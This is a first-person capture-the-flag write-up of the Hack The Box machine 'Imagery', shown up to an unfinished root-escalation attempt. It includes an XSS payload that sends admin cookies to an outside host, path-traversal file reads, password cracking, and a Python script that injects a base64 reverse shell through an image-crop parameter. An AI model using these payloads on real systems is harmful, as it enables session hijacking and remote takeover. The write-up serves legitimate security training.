
# Imagery HTB Writeup (Live Logging Style)

So, I started by running nmap on the target to see what ports are open. Only port 22 and port 80  showed up. Which is what most of the times . A web app with some flaw and use it to get reverse shell . CLASSIC

But this it is Flask Server

```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Imagery]
└─$ cat nmap.results                  
# Nmap 7.95 scan initiated Mon Sep 29 10:30:04 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -O -A -oN nmap.results 10.10.11.88
Nmap scan report for 10.10.11.88
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   218.76 ms 10.10.14.1
2   217.99 ms 10.10.11.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 29 10:30:27 2025 -- 1 IP address (1 host up) scanned in 23.31 seconds    
```


Alright . It's ffuf time for directory busting against the Flask app. Start with the common wordlist and check responses.

Lets do explore the website in mean time . 
While exploring I found this email **`support@imagery.com`**. 

And I see a login page , lets try SQLi . NOPE
The UI refused to submit payloads. Not surprising , many web frontends sanitize or the request is handled via JS/XHR. Maybe we need to bypass the UI directly via Burp

And the ffuf is still running , in mean time I've registered as user and login successfully to explore it even more

I see we can upload images here . And upload dialog gave an account ID: **`5c7ac980`**.  

While filling dialog box ,we can add images to groups existing or create new one . When creating it says feature still in development . So there must be .git folder repo or a subdomain for development

And I also noticed, when adding a name for image , the HTML tags are sanitized.  
Angle brackets are removed in name . The name we added **`<i>Batman</i>`** is being validated . It is removing angle brackets and we can only **`iBatman/i`*** as name

And the download attempt to the image we have uploaded is showing this GET request
**`http://10.10.11.88:8000/uploads/71ff5bd0-c178-4e71-bb89-66ed91f21b5e_Batman.jpg`**

But when I do same visit in the browser , it is viewing the image and not downloading it 

Now uploading again the same image but this time the name is **`&lt;i&gt;Batman&lt;/i&gt;`**  . To see what happens and the images are being deleted with a cronojob or a service running I guess
And giving the description of the image also same as name

OKAY NOW I can see the name and description with HTML tags **`<i>Batman</i>`** , but no HTML rendering . It is showing as is in webpage .

LFI also doesn't seem to be working . Not vulnerable 

Checking out the view page source . And the view page source seems to have a lot of JS code . So there may not be seperate JS files for this and I see one endpoint admin while scrolling through the JS code in view page source
	-  window.location.origin}/admin/delete_user

Lets see what else admin endpoints we can get
-  **`window.location.origin}/admin/delete_bug_report`**
- **`/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log`**	
-  **`window.location.origin}/admin/delete_user`**
-  **`/admin/users`**

This admin functionality endpoints exposed in JS hints at privileged APIs. Maybe something we can abuse

Finally we have our dirbusting ffuf results . Lets take a look at them 
```bash
images        [Status: 401, Size: 59, Words: 4, Lines: 2, Duration: 222ms]
register      [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 220ms]
login         [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 233ms]	logout        [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 220ms]	upload_image  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 227ms]
	
	:: Progress: [38267/38267] :: Job [1/1] :: 88 req/sec :: Duration: [0:08:12] :: Errors: 0 ::
```

Now I'm thinkung , there is admin endpoint we which saw in JS . There is no admin endpoint in ffuf results . Huhh . Strange
Atlease there should be 403 error for admin in ffuf right . So if we missed admin , what other endpoints we could have missed . Lets try with another wordlist

While we run this ffuf with new wordlist , lets see what we can do with subdomain busting without the domain . After lot of research , I dont think it leads me anywhere positive

And the nmap results says this - 
http-server-header: Werkzeug/3.1.3 Python/3.12.7 . Lets see what vulns are there for these versions 

No active vulns for that server version
Ah, if we had the secret key, we could just forge the cookies . It could be simple as that.

If the SECRET_KEY is weak, flask‑unsign can crack it out . Once you can crack it , you can sign sessions, you can make the app believe anything and become whoever you like.

No signs of bruteforcing the SECRET KEY . Throwing errors when decoding . Why ?? Maybe some 

Finally after lot of head banging , i figured out  why the error was . 
The keys from the wordlist like numbers 1234 as treated as int and not string . Thats why this error
And we used this command arg --no-literal-eval to avoid this error

And this is final dead . I cant crack cookie , no secret key . Without secret key, you cant think of session hijacking or cookie forging without SECRET_KEY. Lets see file upload vulnerabilities for reverse shell

I've created a python script to get RCE called rce.py . Lets upload it with Burp and see
```python3
import os
os.system("sh -i >& /dev/tcp/10.10.14.12/8888 0>&1")  
```

Uploading it from burp with `.py` extension didn't work . Now I've changed `.py` to `.jpg` . Lets upload it now .

Yeah now it works . Uploading it by changing extension WORKS

Okay this also didn't work , says error when navigating . Clearly changing extensions also are not working.

Lets check for python version vulns if there are any . I didn't give a thought for this. Maybe there could be a vuln in this python version. Lets google it

Okay after googling , there is no blog or site which provides hope for python version vuln

And since this is flask, Flask uses Jinja . Could be worth checking if the templates handle input safely.

Tried the Jinja probe in Burp . No luck. Either my assumption's wrong or the server's not vulnerable.

Looking for more on Flask , any ways to exploit it . 

There's a blog says Flask can do SSRF . I'll start a python listener and watch if the app decides to talk back.

Nope this doesn't work at all. I want to check again if there are any file upload vulnerabilities for this python or flask server version. GOOGLE Again

I still haven't tried UDP . Lets do UDP scan since we are not getting any leads. Maybe an UDP scan works . Lets rustscan it 

Nope nothing here too

And I've got an idea to change file name to this `./../../../../../../../../../../../../../etc/Batman.jpg` while uploading image via Burp and try LFI one last time.

But the URL it generated for download is 
` http://10.10.11.88:8000/uploads/f7f9490a-ea98-4459-b76a-7fd178df087c_etc_Batman.jpg`

It is sanitizing the name . So no chance of LFI at all . CONFIRMED
Huhh So it is sanitizing the URLs . What to do ????

Lets visit admin users and see what we get . But this is what I get 
**`message "Access denied. Administrator privileges required."
`success false`

I was thinking if we can tamper cookies without SECRET_KEY . Is there a chance ? It sound more promising than others

Tried visiting Debbuger and console endpoint also . But no luck here either

Tried LFI through the image viewer. No file leakage; either it's filtered or not reachable
Maybe there is something in view page source I must be missing . 

Got the register endpoint page source . Something’s off . 
Time to trace what it actually does, not what it says

Nope nothing flaw here . Checked the login source as well . Same story, **CLEAN**

Probing the admin endpoint again by setting `isAdmin=true` on login and watch what the server actually returns
Nope , nothing we got from setting isAdmin = true in the login payload

Tried `isAdmin=true` on register . It accepted. Logged in, but `/admin/users` still blocks me . Something’s enforcing checks on server-side.

Checked the file upload in the source . Nothing unusual, probably handled safely as nothing looks juicy.

Did flask-unsign decode , and now trying if I can modify params of decoded cookie and send request to get admin access

Nope that's not possible. It was a failure but it was worth a try.

Thinking if a subdomain in the URL changes behavior . watching how the server resolves it. **NOPE THATS NOT IT**

Oh there is a bug report link which I've missed totally. Here we can do something interesting here . Here we can use title and description field to get XSS attacks and steal sessions . 

But these reports are checked by admin , so admin checks this bug reports constantly . So we can do XSS to get admin cookies . So lets get creative here

```html
<img src=x onerror=“new Image().src=‘http://10.10.14.11:8000/?=‘+encodeURIComponent(document.cookie)">
```

This one failed and I continued to try payloads.

Tried so many XSS payloads , but this one worked finally after lots of tries
**`<img src=x onerror=fetch('http://10.10.14.11:8000/?c='+btoa(document.cookie))>`**

The above fetched me cookie in base64 and I've decoded and navigated to /admin/users by updating cookies in browser . And this is what I got after decoding

```json
{"anyAdminExists":true,
"success":true,
"users":
[{"displayId":"a1b2c3d4","isAdmin":true,"isTestuser":false,"username":"admin@imagery.htb"},{"displayId":"e5f6g7h8","isAdmin":false,"isTestuser":true,"username":"testuser@imagery.htb"}]
}
```

2 user account . Admin and the other one is ours.
An admin panel exists . Keep note of that and don't jump to conclusions about access.

Admin session might let us enumerate paths. Do a little dir busting with admin session. Lets do ffuf to do dirbusting with admin session.

```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Imagery]
└─$ cat admin.dir.results | jq . | grep url
      "url": "http://10.10.11.88:8000/images",
      "url": "http://10.10.11.88:8000/login",
      "url": "http://10.10.11.88:8000/register",
      "url": "http://10.10.11.88:8000/logout",
      "url": "http://10.10.11.88:8000/upload_image",
    "proxyurl": "",
    "replayproxyurl": "",
    "url": "http://10.10.11.88:8000/FUZZ",

```

Okay you'll get bug report XSS callback when you upload an image . Huhh

Lets revisit the dir bustinng ouput to see what endpoints we can visit as admin . Maybe I am missing something

Running ffuf with new wordlist with admin session and visited the debug and console endpoints . But NOPE

Lets see what download log button gives out. Nothing that interesting
But I've noticed we have LFI in get_system_log endpoint
	- `http://10.10.11.88:8000/admin/get_system_log?log_identifier=/../../../../../../../../../etc/passwd`

###### And we have these users
- root:x:0:0:root:/root:/bin/bash
- web:x:1001:1001::/home/web:/bin/bash
- mark:x:1002:1002::/home/mark:/bin/bash

###### Lets see etc/hosts and see what we can get
- 127.0.0.1 localhost
- 127.0.0.1 Imagery imagery.htb

Maybe there is a folder in /var/www called imagery.htb ??
And lets look at flask dir structure to see what we can get interestingly

```bash
my-flask-app/
    ├── app/
    │   ├── __init__.py
    │   ├── views.py  # or routes.py
    │   ├── models.py
    │   ├── forms.py
    │   ├── static/
    │   │   ├── css/
    │   │   │   └── style.css
    │   │   ├── js/
    │   │   │   └── main.js
    │   │   └── img/
    │   │       └── logo.png
    │   └── templates/
    │       ├── base.html
    │       ├── index.html
    │       └── auth/
    │           └── login.html
    ├── config.py
    ├── run.py
    ├── requirements.txt
    ├── .flaskenv
    └── venv/
```

Maybe we can get .flaskenv if we get the root dir right. Tried but didn't

But I got app.py
- http://10.10.11.88:8000/admin/get_system_log?log_identifier=../app.py

Nothing fancy from app.py . Downloaded config.py
We get this DATA_STORE_PATH = 'db.json'

  Downloaded db.json file too . And got these

    "username": "admin@imagery.htb",
    "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",

    "username": "testuser@imagery.htb",
    "password": "2c65c8d7bfbca32a3ed42596192384f6",

Lets crack them . Lets navigate to crackstation 
And we got **`testuser@imagery.htb`** as **`iambatman`**

Maybe the creator is a batman fan just like me . I was also uploading batman images xD

Okay lets use this password for found linux account via SSH
```bash
└─$ ssh web@10.10.11.88
web@10.10.11.88: Permission denied (publickey).
```

Maybe no access via password. Need public key I guess
Lets login as the testuser and see what did he upload

He didnt upload anything , but he can create groups . If I can point that group uploads to root dir , I can run a python reverse shell and get it maybe

Creating groups is not possible , it is saying GroupName cannot be empty even when provided. Lets see what it the source code for this. View Page Source.

Nothing I can find. Lets see app.py again and understand its functionality. Maybe there is a code injection ??

  There are registered blueprints in app.py 
- app_core.register_blueprint(bp_auth)
- app_core.register_blueprint(bp_upload)
- app_core.register_blueprint(bp_manage)
- app_core.register_blueprint(bp_edit)
- app_core.register_blueprint(bp_admin)
- app_core.register_blueprint(bp_misc)

And there is environment variable in config.py . Lets see what is it from /proc/self/environ
- Nope found empty. environ file returns nothing

And we found this in config.py 
- BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
- BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

```python
# CONFIG.PY FILE
import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)

MAX_LOGIN_ATTEMPTS = 10
ACCOUNT_LOCKOUT_DURATION_MINS = 1

ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
ALLOWED_UPLOAD_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'application/pdf'
}
ALLOWED_TRANSFORM_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff'
}
MAX_FILE_SIZE_MB = 1
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
PRIVATE_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('172.0.0.0/12'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16')
]
AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'
```

Lets look for SSH private keys in home dirs of the account as password login is denied and we need key
Couldn't find keys private keys

The X-Bypass-Lockout header is used for rate limiting . If it is not given , account lockout is possible .

So the Header expects CRON_BYPASS_TOKEN env var as value , but since there is no such env var from earlier checking environ file , we can use default-secret-token-for-dev to bypass lockout

But what can we do with it ? Bruteforce . But what ?????

We can bruteforce SECRET_KEY but it randomly generated , and it is only good for session keys . But how do we get RCE from it ???

Checking blueprints , like what can we do with it

Maybe they are present inside routes folder . Lets see . Nope no routes folder I guess

From ffuf dir busting I can see there is a utils.py file

Just how the app is configured in backend . Nothing useful I believe

Shit in app.py , the packages imported are files actually . So we have the below files
- api_auth.py
- api_upload.py
- api_manage.py
- api_edit.py
- api_admin.py
- api_misc.py

Lets download them

API EDIT file has a a conversion type - crop where we can generate shell when subprocess is ran. Just need to figure out how . Now I need to figure out how to send an API request or whatever is it to get shell

```python
from flask import Blueprint, request, jsonify, session
from config import *
import os
import uuid
import subprocess
from datetime import datetime
from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, get_file_mimetype, _calculate_file_md5

bp_edit = Blueprint('bp_edit', __name__)

@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    
    request_payload = request.get_json()
    
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        else:
            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Transformed: {original_image['title']}",
            'description': f"Transformed from {original_image['title']} ({transform_type}).",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Transformed',
            'type': 'transformed',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath)
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500

@bp_edit.route('/convert_image', methods=['POST'])
def convert_image():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    target_format = request_payload.get('targetFormat')
    if not image_id or not target_format:
        return jsonify({'success': False, 'message': 'Image ID and target format are required.'}), 400
    if target_format.lower() not in ALLOWED_MEDIA_EXTENSIONS:
        return jsonify({'success': False, 'message': 'Target format not allowed.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to convert.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    current_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if target_format.lower() == current_ext:
        return jsonify({'success': False, 'message': f'Image is already in {target_format.upper()} format.'}), 400
    try:
        unique_output_filename = f"converted_{uuid.uuid4()}.{target_format.lower()}"
        output_filename_in_db = os.path.join('admin', 'converted', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, output_filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        new_file_md5 = _calculate_file_md5(output_filepath)
        if new_file_md5 is None:
            os.remove(output_filepath)
            return jsonify({'success': False, 'message': 'Failed to calculate MD5 hash for new file.'}), 500
        for img_entry in application_data['images']:
            if img_entry.get('type') == 'converted' and img_entry.get('original_id') == original_image['id']:
                existing_converted_filepath = os.path.join(UPLOAD_FOLDER, img_entry['filename'])
                existing_file_md5 = img_entry.get('md5_hash')
                if existing_file_md5 is None:
                    existing_file_md5 = _calculate_file_md5(existing_converted_filepath)
                if existing_file_md5:
                    img_entry['md5_hash'] = existing_file_md5
                    _save_data(application_data)
                if existing_file_md5 == new_file_md5:
                    os.remove(output_filepath)
                    return jsonify({'success': False, 'message': 'An identical converted image already exists.'}), 409
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Converted: {original_image['title']} to {target_format.upper()}",
            'description': f"Converted from {original_image['filename']} to {target_format.upper()}.",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Converted',
            'type': 'converted',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath),
            'md5_hash': new_file_md5
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Converted' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Converted'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image converted successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        if os.path.exists(output_filepath):
            os.remove(output_filepath)
        return jsonify({'success': False, 'message': f'Image conversion failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during conversion: {str(e)}'}), 500

@bp_edit.route('/delete_image_metadata', methods=['POST'])
def delete_image_metadata():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    if not image_id:
        return jsonify({'success': False, 'message': 'Image ID is required.'}), 400
    application_data = _load_data()
    image_entry = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not image_entry:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to modify.'}), 404
    filepath = os.path.join(UPLOAD_FOLDER, image_entry['filename'])
    if not os.path.exists(filepath):
        return jsonify({'success': False, 'message': 'Image file not found on server.'}), 404
    try:
        command = [EXIFTOOL_PATH, '-all=', '-overwrite_original', filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Metadata deleted successfully from image!'}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Failed to delete metadata: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during metadata deletion: {str(e)}'}), 500


```

apply_visual_transform is the endpoint
- http://$IP:8000/apply_visual_transform

And we have to do this from test user account only
We need JSON payload with these params
- imageId
- transformType --- which could be crop

And we need to upload an image and findout the ID of it
And the image must be in the allowed mime type list
And extension should be in allowed list

We have to modify the extension some how to allow command injection
Or there is a params dict in payload "x" and "y" "width" and "height"

Lets send the request , we can upload file and get its ID by dumping db.json file

Uploaded a file and dumped db.json file
This is the id - 6ed3b6c0-826d-4894-a3b4-d2b6c693652a

Now sending curl request
```bash
curl -H "Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aN9RUw.OWHWbAClXsoFgs1Uk0yytql60oQ" http://$IP:8000/apply_visual_transform --json '{"imageId":"6ed3b6c0-826d-4894-a3b4-d2b6c693652a", "transformType" : "crop", "params" : "{'x': 20,
'y': ; 10,
'width' : 'echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQ0NCAwPiYxCg== | base64 -d | bash #',
'height' : 222}"}
```
  
Created the python program for the same above payload and request . Lets run it and see if we get shell

We need to add Content-Type too . Lets add it in the program
```python
import requests

BASE_URL = "http://10.10.11.88:8000/"
ENDPOINT = "apply_visual_transform"

sessionContentTypeHeader = {"Cookie" : "session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aN_eAw.FObcxxeYVxrGtH_n1xYtQlXlSFo",
        "Content-Type" : "application/json"}

payLoad = {"imageId" : "f0571910-eb84-475c-9124-85cef7eaefa7",
        "transformType" : "crop",
        "params" : {
        "x" : 12,
        "y" : 24,
        "width" : "; echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQ0NCAwPiYxCg== | base64 -d | bash #",
        "height" : 2222
        }

}

shellRequest = requests.post(BASE_URL+ENDPOINT, headers=sessionContentTypeHeader, json=payLoad)

print(shellRequest.text)  
```
And we got the reverseShell of web account

Now lets do some recon

There is a `backup` folder inside `/var/`
Lets dump it locally and see what it is
It is encrypted . How to unzip it .
And I got this
- PASSWORD = "strongsandofbeach"
-  BYPASS_TOKEN = "K7Zg9vB$24NmW!q8xR0p%tL!"

It looks like we can convert this encrypted file to a hash and we can crack it .  But for that we need a perl program which is **`aescrypt2hashcat.pl`**

We tried this way . . . 
```bash
perl aescrypt2hashcat.pl Backup/web_20250806_120723.zip.aes > backup.hash
```

And it converted to a hash . . . .
Lets wait and crack it using bruteforce . 
Cracked the file password - bestfriends

And now to decrypt the file , we need to use this password . 
We need this pip3 install pyAesCrypt to decrypt the file

```bash
┌──(env)─(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Imagery]
└─$ pyAesCrypt -d Backup/web_20250806_120723.zip.aes -o Backup/decrypted.zip
Password: bestfriends
```

Decypted the file and navigated to web app folder . Read db.json file and it has this
- `mark : 01c3d2e5bdaf6134cec0a367cf53e535`

And it decrypted to supersmash
Lets SSH into mark account . We cant . So just su mark and switch accounts

Mark can use (ALL) NOPASSWD: /usr/local/bin/charcol as root . Lets see what it is

We can start an interactive shell , but it requires password . I've resetted the password to default .
which is no password mode . And have to restart the application now

Lets See how .

Ran the same charcol command and I was able to reset to no password and get shell
Now figuring out how to get rootshell

We can backup files , as we run this as root , so the files will also be as root . Then we can extract the files

In this backup file , we need to place a suid rootshell .
Lets write a C code to get that .

Nope that maynot be possible , as we are backing up and not running . Maybe we can dump root dir and get shell if it has private SSH keys . huhh

Lets do that. So created a tmp folder , /tmp/r3b00t and the backup will be placed there and will be extracted there
No I cant dump /root folder . Access denied. Maybe we can do something with cron jobs

No we can do backup

```bash
sudo $charcol backup -i /root/ -o /tmp/r3b00t/backup --no-timestamp --name rootDump
```
  

Added the cronjob , lets wait for a min and see if it dumps the root dir in the backup

The dir has a file , but not sure if it is cron generated . Deleted that and lets wait for a min to see if it generates again

Nope cant see the file now

And the job is also deleted . Lets add again
```bash
auto add --schedule "* * * * *" --command "charcol backup -i /root/ -o /tmp/r3b00t/backup --no-timestamp" --name "rootDump"
charcol> auto list
[2025-10-03 09:33:11] [INFO] Charcol-managed auto jobs:
[2025-10-03 09:33:11] [INFO]   ID: 05153e97-e8ae-4227-ae62-104cd3ec1879
[2025-10-03 09:33:11] [INFO]   Name: rootDump
[2025-10-03 09:33:11] [INFO]   Command: * * * * * CHARCOL_NON_INTERACTIVE=true charcol backup -i /root/ -o /tmp/r3b00t/backup --no-timestamp
```
  
I think the file was added by cron , i deleted because of timestamp. But there is no file now too

Lets add cron job this time with log file
```bash
auto add --schedule "* * * * *" --command "charcol backup -i /root/ -o /tmp/r3b00t/backup --no-timestamp" --name "rootDump" --log-output /tmp/r3b00t/backup.log
```
  
The log shows it is cleaning the archive file too . Thats why we are not seeing it
```bash
[2025-10-03 09:37:01] [INFO] No encryption password provided and application is in 'no password' mode. Creating unencrypted     archive.
[2025-10-03 09:37:01] [INFO] Output file will be: /tmp/r3b00t/backup.zip
[2025-10-03 09:37:01] [INFO] Creating temporary archive: /tmp/r3b00t/backup.zip of type zip...
[2025-10-03 09:37:01] [INFO] Temporary archive created successfully at /tmp/r3b00t/backup.zip
[2025-10-03 09:37:01] [INFO] Set permissions for temporary archive file to 0o664
[2025-10-03 09:37:01] [INFO] Set ownership for temporary archive file to root:root
[2025-10-03 09:37:01] [INFO] Moving unencrypted archive to final destination: /tmp/r3b00t/backup.zip...
[2025-10-03 09:37:01] [INFO] Unencrypted backup saved to: /tmp/r3b00t/backup.zip
[2025-10-03 09:37:01] [INFO] Set permissions for final output file to 0o664
[2025-10-03 09:37:01] [INFO] Set ownership for final output file to root:root
[2025-10-03 09:37:01] [INFO] Cleaned up temporary archive file: /tmp/r3b00t/backup.zip
